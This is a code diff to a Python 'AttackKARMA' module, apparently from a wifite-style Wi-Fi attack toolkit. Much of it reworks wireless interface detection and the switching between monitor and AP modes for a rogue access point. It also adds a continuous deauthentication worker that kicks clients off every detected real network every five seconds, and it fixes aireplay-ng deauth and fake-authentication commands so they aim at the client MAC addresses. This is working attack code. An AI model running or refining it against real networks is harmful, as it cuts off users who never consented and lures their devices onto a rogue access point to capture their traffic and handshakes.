@@ -65,6 +65,8 @@ class AttackKARMA(Attack):
         self.real_networks = []        # List of real networks with clients
         self.deauth_active = False     # Deauth attack status
         self.handshake_capture_active = False
+        self.deauth_intensity = {}    # Track attack intensity per network
+        self.deauth_attempts = {}     # Track attempts per network
         
         # Enhanced handshake capture management
         self.active_capture_threads = {}  # Track active capture threads
@@ -161,7 +163,7 @@ class AttackKARMA(Attack):
             Color.pl('{!} {O}Error checking dual interface setup: {O}%s{W}' % str(e))
     
     def get_available_interfaces(self):
-        """Get list of available wireless interfaces dynamically from system"""
+        """Get list of available wireless interfaces"""
         try:
             interfaces = []
             
@@ -191,75 +193,15 @@ class AttackKARMA(Attack):
             except Exception as e:
                 Color.pl('{!} {O}ip command method failed: {O}%s{W}' % str(e))
             
-            # Method 3: Check for common interface names (dynamic detection)
-            # Get common interface patterns from system
-            common_patterns = ['wlan', 'wlp', 'wlx']
-            for pattern in common_patterns:
+            # Method 3: Check for common interface names
+            common_names = ['wlan0', 'wlan1', 'wlan2', 'wlp3s0', 'wlp4s0']
+            for name in common_names:
                 try:
-                    # Use dynamic sysfs path detection
-                    sysfs_net_path = '/sys/class/net/'
-                    result = subprocess.run(['ls', sysfs_net_path], capture_output=True, text=True, timeout=2)
-                    if result.returncode == 0:
-                        for line in result.stdout.split('\n'):
-                            interface = line.strip()
-                            if interface.startswith(pattern) and interface not in interfaces:
-                                # Verify it's actually a wireless interface
-                                try:
-                                    test_result = subprocess.run(['iwconfig', interface], capture_output=True, text=True, timeout=1)
-                                    if test_result.returncode == 0:
-                                        interfaces.append(interface)
-                                except:
-                                    pass
+                    result = subprocess.run(['iwconfig', name], capture_output=True, text=True, timeout=2)
+                    if result.returncode == 0 and name not in interfaces:
+                        interfaces.append(name)
                 except:
                     pass
-            
-            # Method 3: Use airmon-ng for additional interfaces
-            try:
-                result = subprocess.run(['airmon-ng'], capture_output=True, text=True, timeout=5)
-                if result.returncode == 0:
-                    for line in result.stdout.split('\n'):
-                        if '\t' in line and not line.startswith('PHY') and not line.startswith('Interface'):
-                            parts = line.split('\t')
-                            if len(parts) >= 2:
-                                interface = parts[1].strip()
-                                if interface and interface not in interfaces:
-                                    interfaces.append(interface)
-            except Exception as e:
-                Color.pl('{!} {O}airmon-ng method failed: {O}%s{W}' % str(e))
-            
-            # Method 4: Check /sys/class/net for wireless interfaces using dynamic path
-            try:
-                import os
-                # Use dynamic sysfs path detection
-                sysfs_net_path = '/sys/class/net'
-                if os.path.exists(sysfs_net_path):
-                    for interface in os.listdir(sysfs_net_path):
-                        if interface.startswith(('wl', 'wlan', 'wlp')):
-                            # Check if it's actually wireless
-                            wireless_path = os.path.join(sysfs_net_path, interface, 'wireless')
-                            if os.path.exists(wireless_path) and interface not in interfaces:
-                                interfaces.append(interface)
-            except Exception as e:
-                Color.pl('{!} {O}/sys/class/net method failed: {O}%s{W}' % str(e))
-            
-            # Method 5: Detect base interfaces from monitor interfaces (airmon-ng scenarios)
-            try:
-                # If we found monitor interfaces, try to detect their base interfaces
-                monitor_interfaces = [iface for iface in interfaces if iface.endswith('mon')]
-                for monitor_iface in monitor_interfaces:
-                    # Extract base interface name (remove 'mon' suffix)
-                    base_iface = monitor_iface[:-3] if monitor_iface.endswith('mon') else monitor_iface
-                    
-                    # Check if base interface exists in sysfs
-                    base_path = os.path.join('/sys/class/net', base_iface)
-                    if os.path.exists(base_path) and base_iface not in interfaces:
-                        # Verify it's a wireless interface
-                        wireless_path = os.path.join(base_path, 'wireless')
-                        if os.path.exists(wireless_path):
-                            interfaces.append(base_iface)
-                            Color.pl('{+} {C}Detected base interface {G}%s{W} from monitor interface {G}%s{W}' % (base_iface, monitor_iface))
-            except Exception as e:
-                Color.pl('{!} {O}Base interface detection failed: {O}%s{W}' % str(e))
             
             Color.pl('{+} {G}Found {C}%d{W} wireless interfaces: {G}%s{W}' % (len(interfaces), ', '.join(interfaces)))
             return interfaces
@@ -341,7 +283,7 @@ class AttackKARMA(Attack):
             return {'name': interface, 'available': False, 'mode': 'unknown', 'status': 'unknown'}
     
     def find_best_interfaces_dynamically(self):
-        """Dynamically find the best interfaces for probe capture and rogue AP"""
+        """Dynamically find the best interfaces for probe capture and rogue AP - completely name-agnostic"""
         try:
             Color.pl('{+} {C}Scanning system for optimal interfaces...{W}')
             
@@ -362,46 +304,78 @@ class AttackKARMA(Attack):
                 Color.pl('{+} {C}Interface {G}%s{W}: {C}Mode={O}%s{W}, {C}Status={O}%s{W}, {C}Available={O}%s{W}' % 
                         (interface, state['mode'], state['status'], 'Yes' if state['available'] else 'No'))
             
-            # Find interfaces by preference
-            monitor_interfaces = [s for s in interface_states if s['mode'] == 'monitor' and s['available']]
-            managed_interfaces = [s for s in interface_states if s['mode'] == 'managed' and s['available']]
-            other_interfaces = [s for s in interface_states if s['available'] and s not in monitor_interfaces and s not in managed_interfaces]
+            # Categorize interfaces by type (completely name-agnostic)
+            # Monitor interfaces: any interface ending with 'mon' or in monitor mode
+            monitor_interfaces = [s for s in interface_states if (s['name'].endswith('mon') or s['mode'] == 'monitor') and s['available']]
             
-            # Select probe interface (prefer monitor mode)
+            # Base interfaces: any interface NOT ending with 'mon' and available
+            base_interfaces = [s for s in interface_states if not s['name'].endswith('mon') and s['available']]
+            
+            # Managed interfaces: any interface in managed mode
+            managed_interfaces = [s for s in interface_states if s['mode'] == 'managed' and s['available']]
+            
+            # Other interfaces: any available interface not in above categories
+            other_interfaces = [s for s in interface_states if s['available'] and s not in base_interfaces and s not in monitor_interfaces]
+            
+            # Select probe interface (prefer monitor mode, but work with any interface)
             probe_interface = None
+            
+            # First priority: Use monitor interface if available
             if monitor_interfaces:
                 probe_interface = monitor_interfaces[0]['name']
                 Color.pl('{+} {G}Selected probe interface: {C}%s{W} (monitor mode - optimal){W}' % probe_interface)
+            # Second priority: Use base interface in managed mode (will switch to monitor)
+            elif base_interfaces:
+                probe_interface = base_interfaces[0]['name']
+                Color.pl('{+} {G}Selected probe interface: {C}%s{W} (base interface - will switch to monitor mode){W}' % probe_interface)
+            # Third priority: Use any managed interface
             elif managed_interfaces:
                 probe_interface = managed_interfaces[0]['name']
                 Color.pl('{+} {G}Selected probe interface: {C}%s{W} (managed mode - will switch to monitor){W}' % probe_interface)
+            # Last resort: Use any available interface
             elif other_interfaces:
                 probe_interface = other_interfaces[0]['name']
                 Color.pl('{+} {G}Selected probe interface: {C}%s{W} (will configure for monitor mode){W}' % probe_interface)
             
-            # Select rogue interface (prefer managed mode, different from probe)
+            # Select rogue interface (MUST be a base interface for AP mode - name-agnostic)
             rogue_interface = None
             
-            # First priority: Find a different interface from probe in managed mode
-            for managed in managed_interfaces:
-                if managed['name'] != probe_interface:
-                    rogue_interface = managed['name']
-                    Color.pl('{+} {G}Selected rogue interface: {C}%s{W} (managed mode - optimal, different from probe){W}' % rogue_interface)
+            # First priority: Find a different base interface from probe
+            for base in base_interfaces:
+                if base['name'] != probe_interface:
+                    rogue_interface = base['name']
+                    Color.pl('{+} {G}Selected rogue interface: {C}%s{W} (base interface - optimal for AP mode, different from probe){W}' % rogue_interface)
                     break
             
-            # Second priority: Find any different interface from probe
-            if not rogue_interface:
-                for other in other_interfaces:
-                    if other['name'] != probe_interface:
-                        rogue_interface = other['name']
-                        Color.pl('{+} {G}Selected rogue interface: {C}%s{W} (will configure for managed mode, different from probe){W}' % rogue_interface)
-                        break
+            # Second priority: Use same base interface as probe (will require mode switching)
+            if not rogue_interface and base_interfaces:
+                # If probe is a monitor interface, use its base interface (name-agnostic)
+                if probe_interface and probe_interface.endswith('mon'):
+                    base_name = probe_interface[:-3]  # Remove 'mon' suffix - works with any name
+                    for base in base_interfaces:
+                        if base['name'] == base_name:
+                            rogue_interface = base['name']
+                            Color.pl('{+} {G}Selected rogue interface: {C}%s{W} (base interface for monitor probe {G}%s{W}){W}' % (rogue_interface, probe_interface))
+                            break
+                else:
+                    # Use same base interface as probe
+                    rogue_interface = probe_interface
+                    Color.pl('{!} {O}Using same base interface for both probe and rogue (will require mode switching){W}')
             
-            # Last resort: Use same interface as probe (will require mode switching)
+            # Last resort: Use any available interface (not recommended)
             if not rogue_interface:
-                # Use same interface as probe (not optimal)
-                rogue_interface = probe_interface
-                Color.pl('{!} {O}Using same interface for both probe and rogue (not optimal){W}')
+                if other_interfaces:
+                    rogue_interface = other_interfaces[0]['name']
+                    Color.pl('{!} {O}Selected rogue interface: {C}%s{W} (not optimal - may not support AP mode){W}' % rogue_interface)
+                else:
+                    rogue_interface = probe_interface
+                    Color.pl('{!} {O}Using same interface for both probe and rogue (not optimal){W}')
+            
+            # Update the rogue_interface to use the base interface if needed (name-agnostic)
+            if rogue_interface and rogue_interface.endswith('mon'):
+                base_rogue = rogue_interface[:-3]  # Remove 'mon' suffix - works with any name
+                Color.pl('{+} {C}Updating rogue interface from {G}%s{W} to base interface {G}%s{W} for AP mode{W}' % (rogue_interface, base_rogue))
+                rogue_interface = base_rogue
             
             return probe_interface, rogue_interface
             
@@ -484,11 +458,25 @@ class AttackKARMA(Attack):
                 Color.pl('{+} {G}Probe interface {C}%s{W} validated: {O}%s{W} mode, {O}%s{W} status' % 
                         (self.probe_interface, probe_state['mode'], probe_state['status']))
             
-            # Check rogue interface
+            # Check rogue interface - handle monitor interface case
             rogue_state = self.get_interface_state(self.rogue_interface)
             if not rogue_state['available']:
-                Color.pl('{!} {R}Rogue interface %s is not available!{W}' % self.rogue_interface)
-                raise ValueError('Rogue interface not available')
+                # If rogue interface is not available, check if it's a base interface that was converted to monitor
+                if self.rogue_interface and not self.rogue_interface.endswith('mon'):
+                    # Check if there's a corresponding monitor interface
+                    monitor_interface = self.rogue_interface + 'mon'
+                    monitor_state = self.get_interface_state(monitor_interface)
+                    if monitor_state['available']:
+                        Color.pl('{+} {C}Base interface {G}%s{W} is not available (converted to monitor mode){W}' % self.rogue_interface)
+                        Color.pl('{+} {C}Monitor interface {G}%s{W} is available - will restore base interface for AP mode{W}' % monitor_interface)
+                        # Keep the base interface name for AP mode - the AP mode operations will handle restoration
+                        Color.pl('{+} {G}Rogue interface will use base interface {C}%s{W} (will be restored from monitor interface for AP mode){W}' % self.rogue_interface)
+                    else:
+                        Color.pl('{!} {R}Rogue interface %s is not available!{W}' % self.rogue_interface)
+                        raise ValueError('Rogue interface not available')
+                else:
+                    Color.pl('{!} {R}Rogue interface %s is not available!{W}' % self.rogue_interface)
+                    raise ValueError('Rogue interface not available')
             else:
                 Color.pl('{+} {G}Rogue interface {C}%s{W} validated: {O}%s{W} mode, {O}%s{W} status' % 
                         (self.rogue_interface, rogue_state['mode'], rogue_state['status']))
@@ -749,20 +737,11 @@ class AttackKARMA(Attack):
             except:
                 Color.pl('{+} {C}NetworkManager status unknown - continuing{W}')
             
-            # Step 2: Stop airmon-ng processes (but don't rely on it)
-            Color.pl('{+} {C}Stopping airmon-ng processes{W}')
-            try:
-                result = subprocess.run(['airmon-ng', 'stop', interface], capture_output=True, text=True, timeout=5)
-                if result.returncode == 0:
-                    Color.pl('{+} {G}airmon-ng stop successful{W}')
-                else:
-                    # This is expected when not running as root - we'll handle it with iwconfig
-                    Color.pl('{!} {O}airmon-ng stop failed (continuing with alternative method){W}')
-            except Exception as e:
-                # This is expected when not running as root - we'll handle it with iwconfig
-                Color.pl('{!} {O}airmon-ng stop failed (continuing with alternative method){W}')
+            # Step 2: Clean up any monitor mode processes (no airmon-ng needed)
+            Color.pl('{+} {C}Cleaning up monitor mode processes{W}')
+            # No need for airmon-ng stop since we're using iwconfig directly
             
-            # Step 4: Use iwconfig to switch to managed mode (like GUI)
+            # Step 3: Use iwconfig to switch to managed mode
             Color.pl('{+} {C}Switching to managed mode{W}')
             try:
                 # First, bring interface down
@@ -810,9 +789,9 @@ class AttackKARMA(Attack):
             return False, interface
     
     def switch_to_monitor_mode(self, interface):
-        """Switch interface to monitor mode using iwconfig (like GUI)"""
+        """Switch interface to monitor mode using iwconfig directly (no airmon-ng)"""
         try:
-            Color.pl('{+} {C}Switching {G}%s{W} to monitor mode...{W}' % interface)
+            Color.pl('{+} {C}Switching {G}%s{W} to monitor mode using iwconfig...{W}' % interface)
             
             # Step 0: Resolve interface name to an actual existing interface
             Color.pl('{+} {C}Resolving interface name...{W}')
@@ -821,7 +800,7 @@ class AttackKARMA(Attack):
             if interface != original_interface:
                 Color.pl('{+} {C}Interface resolved: {O}%s{W} -> {G}%s{W}' % (original_interface, interface))
             
-            # Step 1: Clean up any managed mode processes
+            # Step 1: Clean up any conflicting processes
             Color.pl('{+} {C}Cleaning up conflicting processes...{W}')
             
             # Check if NetworkManager is running
@@ -834,33 +813,42 @@ class AttackKARMA(Attack):
             except:
                 Color.pl('{+} {C}NetworkManager status unknown - continuing{W}')
             
-            # Step 2: Use airmon-ng to start monitor mode (more reliable for monitor mode)
-            Color.pl('{+} {C}Starting monitor mode{W}')
+            # Step 2: Use iwconfig directly to switch to monitor mode
+            Color.pl('{+} {C}Switching to monitor mode using iwconfig{W}')
             try:
-                result = subprocess.run(['airmon-ng', 'start', interface], capture_output=True, text=True, timeout=10)
-                if result.returncode == 0:
-                    Color.pl('{+} {G}airmon-ng start successful{W}')
-                    
-                    # Find the monitor interface name
-                    monitor_iface = self.find_monitor_interface_dynamically(interface)
-                    if monitor_iface:
-                        Color.pl('{+} {G}Found monitor interface: {G}%s{W}' % monitor_iface)
-                        return True, monitor_iface
-                    else:
-                        # Check if original interface is now in monitor mode
-                        result = subprocess.run(['iwconfig', interface], capture_output=True, text=True, timeout=3)
-                        if result.returncode == 0 and 'Mode:Monitor' in result.stdout:
-                            Color.pl('{+} {G}Interface is in monitor mode{W}')
-                            return True, interface
-                        else:
-                            Color.pl('{!} {R}Could not verify monitor mode{W}')
-                            return False, interface
+                # First, bring interface down
+                subprocess.run(['ifconfig', interface, 'down'], capture_output=True, timeout=3)
+                time.sleep(1)
+                
+                # Set monitor mode using iwconfig
+                result = subprocess.run(['iwconfig', interface, 'mode', 'monitor'], capture_output=True, text=True, timeout=5)
+                if result.returncode != 0:
+                    Color.pl('{!} {O}iwconfig monitor mode failed: {O}%s{W}' % result.stderr.strip())
+                    # Try bringing interface up first
+                    subprocess.run(['ifconfig', interface, 'up'], capture_output=True, timeout=3)
+                    time.sleep(1)
+                    result = subprocess.run(['iwconfig', interface, 'mode', 'monitor'], capture_output=True, text=True, timeout=5)
+                    if result.returncode != 0:
+                        Color.pl('{!} {R}Failed to set monitor mode: {O}%s{W}' % result.stderr.strip())
+                        return False, interface
+                
+                # Bring interface back up
+                subprocess.run(['ifconfig', interface, 'up'], capture_output=True, timeout=3)
+                time.sleep(1)
+                
+                Color.pl('{+} {G}Successfully switched to monitor mode{W}')
+                
+                # Verify monitor mode
+                result = subprocess.run(['iwconfig', interface], capture_output=True, text=True, timeout=3)
+                if result.returncode == 0 and 'Mode:Monitor' in result.stdout:
+                    Color.pl('{+} {G}✓ Interface {G}%s{W} is in monitor mode{W}' % interface)
+                    return True, interface
                 else:
-                    Color.pl('{!} {O}airmon-ng start failed: {O}%s{W}' % result.stderr.strip())
+                    Color.pl('{!} {R}Could not verify monitor mode{W}')
                     return False, interface
                     
             except Exception as e:
-                Color.pl('{!} {R}Failed to start monitor mode: {O}%s{W}' % str(e))
+                Color.pl('{!} {R}Failed to switch to monitor mode: {O}%s{W}' % str(e))
                 return False, interface
                 
         except Exception as e:
@@ -925,70 +913,43 @@ class AttackKARMA(Attack):
             return False, interface
     
     def verify_interface_mode(self, interface, target_mode):
-        """Dynamic verification of interface mode with smart interface detection"""
+        """Verify interface mode - handles both string and list parameters"""
         try:
             Color.pl('{+} {C}Verifying interface mode for {G}%s{W}...{W}' % interface)
+            
+            # Handle both string and list parameters
+            if isinstance(target_mode, list):
+                target_modes = target_mode
+            else:
+                target_modes = [target_mode]
             
             # First, try to verify with the given interface name
             result = subprocess.run(['iwconfig', interface], capture_output=True, text=True, timeout=3)
             if result.returncode == 0:
                 Color.pl('{+} {C}Debug: iwconfig output: {G}%s{W}' % result.stdout.strip())
                 
-                if target_mode == 'managed':
-                    if 'Mode:Monitor' not in result.stdout:
-                        Color.pl('{+} {G}✓ Interface {G}%s{O} is in managed mode{W}' % interface)
-                        return True
-                    else:
-                        Color.pl('{!} {R}✗ Interface still in monitor mode{W}')
-                elif target_mode == 'monitor':
-                    if 'Mode:Monitor' in result.stdout:
-                        Color.pl('{+} {G}✓ Interface {G}%s{O} is in monitor mode{W}' % interface)
-                        return True
-                    else:
-                        Color.pl('{!} {R}✗ Interface not in monitor mode{W}')
-                elif target_mode == 'master':
-                    if 'Mode:Master' in result.stdout or 'Mode:AP' in result.stdout:
-                        Color.pl('{+} {G}✓ Interface {G}%s{O} is in AP mode{W}' % interface)
-                        return True
-                    else:
-                        Color.pl('{!} {R}✗ Interface not in AP mode{W}')
+                # Check if interface is in any of the target modes
+                for mode in target_modes:
+                    if mode.lower() == 'managed':
+                        if 'Mode:Monitor' not in result.stdout and 'Mode:Master' not in result.stdout:
+                            Color.pl('{+} {G}✓ Interface {G}%s{O} is in managed mode{W}' % interface)
+                            return True
+                    elif mode.lower() == 'monitor':
+                        if 'Mode:Monitor' in result.stdout:
+                            Color.pl('{+} {G}✓ Interface {G}%s{O} is in monitor mode{W}' % interface)
+                            return True
+                    elif mode.lower() in ['master', 'ap']:
+                        if 'Mode:Master' in result.stdout or 'Mode:AP' in result.stdout:
+                            Color.pl('{+} {G}✓ Interface {G}%s{O} is in AP mode{W}' % interface)
+                            return True
+                
+                Color.pl('{!} {R}✗ Interface not in target mode{W}')
+                return False
             else:
                 Color.pl('{!} {R}✗ Could not get interface status for {G}%s{W}' % interface)
                 Color.pl('{!} {O}Debug: iwconfig stderr: {O}%s{W}' % result.stderr.strip())
+                return False
                 
-                # Dynamic interface detection - find the correct interface
-                Color.pl('{+} {C}Attempting dynamic interface detection...{W}')
-                actual_interface = self.find_correct_interface_for_verification(target_mode)
-                
-                if actual_interface and actual_interface != interface:
-                    Color.pl('{+} {C}Found correct interface: {G}%s{W}' % actual_interface)
-                    return self.verify_interface_mode(actual_interface, target_mode)
-                else:
-                    Color.pl('{!} {R}Could not find correct interface for verification{W}')
-            
-            # Fallback: Check if interface is at least UP and responsive
-            Color.pl('{+} {C}Trying fallback verification...{W}')
-            try:
-                subprocess.run(['ifconfig', interface, 'up'], capture_output=True, timeout=3)
-                time.sleep(1)
-                
-                # Test if interface responds
-                test_result = subprocess.run(['iwconfig', interface], capture_output=True, text=True, timeout=3)
-                if test_result.returncode == 0:
-                    Color.pl('{+} {G}✓ Interface {G}%s{O} is responsive{W}' % interface)
-                    # If we're trying to get managed mode and interface is responsive, accept it
-                    if target_mode == 'managed':
-                        Color.pl('{+} {G}✓ Interface appears to be in managed mode (responsive){W}')
-                        return True
-                else:
-                    Color.pl('{!} {R}✗ Interface not responsive{W}')
-                    Color.pl('{!} {O}Debug: fallback stderr: {O}%s{W}' % test_result.stderr.strip())
-            except Exception as e:
-                Color.pl('{!} {O}Fallback verification failed: {O}%s{W}' % str(e))
-            
-            Color.pl('{!} {R}Verification failed{W}')
-            return False
-            
         except Exception as e:
             Color.pl('{!} {R}Error in verify_interface_mode: {O}%s{W}' % str(e))
             return False
@@ -1064,7 +1025,8 @@ class AttackKARMA(Attack):
             # Kill conflicting processes first
             Color.pl('{+} {C}Cleaning up conflicting processes...{W}')
             subprocess.run(['pkill', '-f', 'hostapd'], capture_output=True)
-            subprocess.run(['pkill', '-f', 'airmon'], capture_output=True)
+            # Clean up any remaining wireless processes
+            subprocess.run(['pkill', '-f', 'iwconfig'], capture_output=True)
             time.sleep(2)
             
             # Check NetworkManager status
@@ -1095,7 +1057,7 @@ class AttackKARMA(Attack):
                 interface = actual_interface  # Use the actual interface name found
                     
             elif target_mode == 'monitor':
-                # For monitor mode, use airmon-ng
+                # For monitor mode, use iwconfig directly
                 success, actual_interface = self.switch_to_monitor_mode(interface)
                 if not success:
                     Color.pl('{!} {R}Failed to switch to monitor mode{W}')
@@ -1136,52 +1098,41 @@ class AttackKARMA(Attack):
         try:
             Color.pl('{+} {C}Switching to master mode (AP mode) for hostapd{W}')
             
-            # If interface ends with 'mon', use the base interface for AP mode
-            base_interface = interface
-            if interface.endswith('mon'):
-                base_interface = interface[:-3]  # Remove 'mon' suffix
-                Color.pl('{+} {C}Using base interface {G}%s{W} for AP mode (from monitor interface {G}%s{W}){W}' % (base_interface, interface))
-            
             # First, bring interface down
-            subprocess.run(['ifconfig', base_interface, 'down'], capture_output=True, timeout=5)
+            subprocess.run(['ifconfig', interface, 'down'], capture_output=True, timeout=5)
             time.sleep(1)
             
-            # Try modern 'iw' command first (preferred)
-            result = subprocess.run(['iw', base_interface, 'set', 'type', '__ap'], 
-                                  capture_output=True, text=True, timeout=10)
-            
-            if result.returncode == 0:
-                Color.pl('{+} {G}Successfully set AP mode using iw{W}')
-            else:
-                # Fallback to iwconfig master mode
-                Color.pl('{!} {O}iw failed, trying iwconfig master mode{W}')
-                result = subprocess.run(['iwconfig', base_interface, 'mode', 'master'], 
-                                      capture_output=True, text=True, timeout=10)
-                
-                if result.returncode != 0:
-                    Color.pl('{!} {R}Failed to set master mode: {O}%s{W}' % result.stderr.strip())
-                    return False
-            
-            # Bring interface back up
-            subprocess.run(['ifconfig', base_interface, 'up'], capture_output=True, timeout=5)
-            time.sleep(2)
-            
-            # Verify AP mode (check for both Master and AP modes)
-            result = subprocess.run(['iwconfig', base_interface], capture_output=True, text=True, timeout=5)
-            if result.returncode == 0 and ('Mode:Master' in result.stdout or 'Mode:AP' in result.stdout):
-                Color.pl('{+} {G}Successfully switched to AP mode{W}')
-                return True
-            else:
-                # Also try iw command for verification
-                result = subprocess.run(['iw', base_interface, 'info'], capture_output=True, text=True, timeout=5)
-                if result.returncode == 0 and 'type AP' in result.stdout:
-                    Color.pl('{+} {G}Successfully switched to AP mode (verified with iw){W}')
+            # Try to set type __ap with iw (modern approach)
+            try:
+                Color.pl('{+} {C}Attempting to set AP mode using iw...{W}')
+                subprocess.run(['iw', interface, 'set', 'type', '__ap'], capture_output=True, timeout=5)
+                time.sleep(1)
+                # Verify mode change
+                if self.verify_interface_mode(interface, ['Master', 'AP']):
+                    Color.pl('{+} {G}Successfully set AP mode using iw for {G}%s{W}' % interface)
                     return True
                 else:
-                    Color.pl('{!} {R}AP mode verification failed{W}')
-                    Color.pl('{!} {O}iwconfig output: {O}%s{W}' % result.stdout.strip())
+                    Color.pl('{!} {O}iw failed, trying iwconfig master mode{W}')
+            except Exception as e:
+                Color.pl('{!} {O}iw command failed: {O}%s{W}' % str(e))
+                Color.pl('{!} {O}iw failed, trying iwconfig master mode{W}')
+            
+            # Fallback to iwconfig (legacy approach)
+            try:
+                Color.pl('{+} {C}Attempting to set AP mode using iwconfig...{W}')
+                subprocess.run(['iwconfig', interface, 'mode', 'master'], capture_output=True, timeout=5)
+                time.sleep(1)
+                # Verify mode change
+                if self.verify_interface_mode(interface, ['Master', 'AP']):
+                    Color.pl('{+} {G}Successfully set AP mode using iwconfig for {G}%s{W}' % interface)
+                    return True
+                else:
+                    Color.pl('{!} {R}Failed to set master mode{W}')
                     return False
-                
+            except Exception as e:
+                Color.pl('{!} {R}Failed to set master mode: {O}%s{W}' % str(e))
+                return False
+            
         except Exception as e:
             Color.pl('{!} {R}Error switching to master mode: {O}%s{W}' % str(e))
             return False
@@ -1198,7 +1149,8 @@ class AttackKARMA(Attack):
             subprocess.run(['pkill', '-f', 'tshark'], capture_output=True)
             
             # Kill any other wireless monitoring processes
-            subprocess.run(['pkill', '-f', 'airmon'], capture_output=True)
+            # Clean up any remaining wireless processes
+            subprocess.run(['pkill', '-f', 'iwconfig'], capture_output=True)
             
             # Give processes time to terminate
             time.sleep(2)
@@ -1574,7 +1526,7 @@ class AttackKARMA(Attack):
                         
                         # Show clients
                         for client in target.clients:
-                            Color.pl('  {G}* {W}Client: {C}%s{W}' % client.bssid)
+                            Color.pl('  {G}* {W}Client: {C}%s{W}' % client.station)
                 
                 # Also check for unassociated clients (probe requests)
                 unassociated_targets = [t for t in targets if t.bssid == 'UNASSOCIATED' and t.clients]
@@ -1613,42 +1565,73 @@ class AttackKARMA(Attack):
             return False
     
     def start_deauth_attack(self):
-        """Start adaptive deauthentication attack to force clients to disconnect"""
-        Color.pl('\n{+} {C}Stage 4: Starting adaptive deauthentication attack{W}')
+        """Start simple aggressive deauthentication attack to force clients to disconnect"""
+        Color.pl('\n{+} {C}Stage 4: Starting aggressive deauthentication attack{W}')
         
         try:
             self.deauth_active = True
-            self.deauth_attempts = {}  # Track attempts per network
-            self.deauth_intensity = {}  # Track attack intensity per network
             
             if not self.real_networks:
                 Color.pl('{!} {R}No real networks to target{W}')
                 return False
             
-            Color.pl('{+} {C}Targeting {G}%d{W} real networks with adaptive deauth packets{W}' % len(self.real_networks))
-            Color.pl('{+} {C}Attack will escalate intensity if clients don\'t connect{W}')
+            Color.pl('{+} {C}Targeting {G}%d{W} real networks with aggressive deauth packets{W}' % len(self.real_networks))
+            Color.pl('{+} {C}Using continuous deauth approach for maximum effectiveness{W}')
             
-            # Start adaptive deauth threads for each network
-            deauth_threads = []
-            for network in self.real_networks:
-                self.deauth_attempts[network.bssid] = 0
-                self.deauth_intensity[network.bssid] = 1  # Start with intensity 1
-                
-                thread = threading.Thread(target=self.adaptive_deauth_network_clients, args=(network,))
-                thread.daemon = True
-                thread.start()
-                deauth_threads.append(thread)
-                
-                if hasattr(self, 'target') and self.target:
-                    Color.pattack('KARMA', self.target, 'Adaptive Deauth', f'Targeting {network.essid}')
+            # Start continuous deauth immediately - no overlap
+            self.start_continuous_deauth()
             
-            Color.pl('{+} {G}Adaptive deauthentication attack active - forcing clients to disconnect{W}')
             return True
             
         except Exception as e:
-            Color.pl('{!} {R}Error starting deauth attack: {O}%s{W}' % str(e))
+            Color.pl('{!} {R}Error in deauth attack: {O}%s{W}' % str(e))
             return False
     
+    def start_continuous_deauth(self):
+        """Start continuous deauth in background to keep clients disconnected - OLD CODE APPROACH"""
+        try:
+            Color.pl('{+} {C}Starting continuous deauth to keep clients disconnected{W}')
+            
+            # Start continuous deauth thread
+            deauth_thread = threading.Thread(target=self.continuous_deauth_worker)
+            deauth_thread.daemon = True
+            deauth_thread.start()
+            
+            Color.pl('{+} {G}Continuous deauth started - clients will be kept disconnected{W}')
+            
+        except Exception as e:
+            Color.pl('{!} {R}Error starting continuous deauth: {O}%s{W}' % str(e))
+    
+    def continuous_deauth_worker(self):
+        """Continuous deauth worker - kicks clients immediately, then every 5 seconds"""
+        try:
+            first_run = True
+            
+            while self.deauth_active and self.running:
+                # On first run, don't wait - kick clients immediately
+                if not first_run:
+                    # Wait 5 seconds between deauth rounds
+                    time.sleep(5)
+                else:
+                    first_run = False
+                
+                if not self.deauth_active or not self.running:
+                    break
+                
+                # Kick clients from all networks
+                if hasattr(self, 'real_networks') and self.real_networks:
+                    for network in self.real_networks:
+                        if network.clients:
+                            Color.pl('{+} {C}Continuous deauth: Kicking clients from {G}%s{W}' % network.essid)
+                            self.kick_clients_from_network(network)
+                            
+                            if hasattr(self, 'target') and self.target:
+                                Color.pattack('KARMA', self.target, 'Continuous Deauth', f'Kicked clients from {network.essid}')
+                
+        except Exception as e:
+            if Configuration.verbose > 1:
+                Color.pl('{!} {R}Error in continuous deauth worker: {O}%s{W}' % str(e))
+
     def adaptive_deauth_network_clients(self, network):
         """Send adaptive deauth packets with balanced approach - give clients time to connect"""
         try:
@@ -1707,7 +1690,7 @@ class AttackKARMA(Attack):
                         except Exception as e:
                             if Configuration.verbose > 1:
                                 Color.pl('{!} {R}Deauth failed for {G}%s{W}: {O}%s{W}' % 
-                                        (client.bssid, str(e)))
+                                        (client.station, str(e)))
                 
                 # Longer sleep to give clients time to connect
                 sleep_time = max(5, deauth_interval)  # Minimum 5 second sleep
@@ -1865,7 +1848,7 @@ class AttackKARMA(Attack):
                 '-0', str(intensity),  # Number of packets based on intensity
                 '--ignore-negative-one',
                 '-a', network.bssid,
-                '-c', client.bssid,
+                '-c', client.station,  # Target client MAC address
                 self.probe_interface
             ]
             
@@ -1922,7 +1905,7 @@ class AttackKARMA(Attack):
         """Try additional attack methods when standard deauth fails"""
         try:
             Color.pl('{+} {R}Trying fallback attacks for {G}%s{W} from {G}%s{W}' % 
-                    (client.bssid, network.essid))
+                    (client.station, network.essid))
             
             # Method 1: Fake authentication then deauth
             fakeauth_cmd = [
@@ -1956,7 +1939,7 @@ class AttackKARMA(Attack):
                     '-0', '5',  # 5 packets per burst
                     '--ignore-negative-one',
                     '-a', network.bssid,
-                    '-c', client.bssid,
+                    '-c', client.station,  # Target client MAC address
                     self.probe_interface
                 ]
                 
@@ -1975,7 +1958,7 @@ class AttackKARMA(Attack):
                 
                 time.sleep(0.5)  # Short delay between bursts
             
-            Color.pl('{+} {C}Fallback attacks completed for {G}%s{W}' % client.bssid)
+            Color.pl('{+} {C}Fallback attacks completed for {G}%s{W}' % client.station)
             
         except Exception as e:
             if Configuration.verbose > 1:
@@ -1990,7 +1973,7 @@ class AttackKARMA(Attack):
                 '-0', '2',  # Reduced to 2 deauth packets
                 '--ignore-negative-one',
                 '-a', network.bssid,  # Target AP
-                '-c', client.bssid,  # Target client
+                '-c', client.station,  # Target client MAC address
                 self.probe_interface
             ]
             
@@ -2014,7 +1997,7 @@ class AttackKARMA(Attack):
             
             if Configuration.verbose > 1:
                 Color.pl('{+} {C}Sent deauth to {G}%s{W} from {G}%s{W}' % 
-                        (client.bssid, network.essid))
+                        (client.station, network.essid))
             
         except Exception as e:
             if Configuration.verbose > 1:
@@ -2617,7 +2600,7 @@ class AttackKARMA(Attack):
                 for network in self.real_networks:
                     if hasattr(network, 'clients'):
                         for client in network.clients:
